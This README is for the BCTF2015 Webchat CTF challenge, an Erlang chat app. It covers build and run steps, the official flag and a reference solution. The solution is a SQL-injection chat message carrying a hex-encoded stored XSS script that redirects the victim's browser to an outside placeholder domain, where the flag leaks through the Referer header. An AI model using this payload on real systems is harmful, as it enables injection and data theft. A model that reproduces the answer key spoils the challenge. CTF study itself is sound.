# BCTF2015-Webchat
The official implementation of BCTF2015 Webchat Challenge.

## Runtime Dependencies:

1. Erlang/OTP 17
  - 3rd-party libraries: cowboy, cowlib, ranch, emysql
2. xorg-server-xvfb
3. Any browser. (firefox is the default setting, as chrome/chromium doesn't work well in container)
4. MySQL or any other MySQL-compatible database.

## How to build?

Just type `make` and it will download dependencies, and then compile.

## How to run?

```
$ _rel/webchat_release/bin/webchat_release start # background running
$ _rel/webchat_release/bin/webchat_release stop # stop a background running instance
$ _rel/webchat_release/bin/webchat_release foreground  # foreground running
$ _rel/webchat_release/bin/webchat_release console # foreground running with console
```

You can attach to a background running erlang VM using `$ _rel/webchat_release/bin/webchat_release attach` to get a console.


## Offical Flag

BCTF{xss_is_not_that_difficult_right}

## Reference Solution

Send a chat message:
```
'), (0x3C7363726970743E77696E646F772E6C6F636174696F6E3D22687474703A2F2F796F7572646F6D61696E2E636F6D2F6263746632303135223B3C2F7363726970743E), ('
```
which produces a XSS payload in the chatlog, and flag will be found in the HTTP header referer.
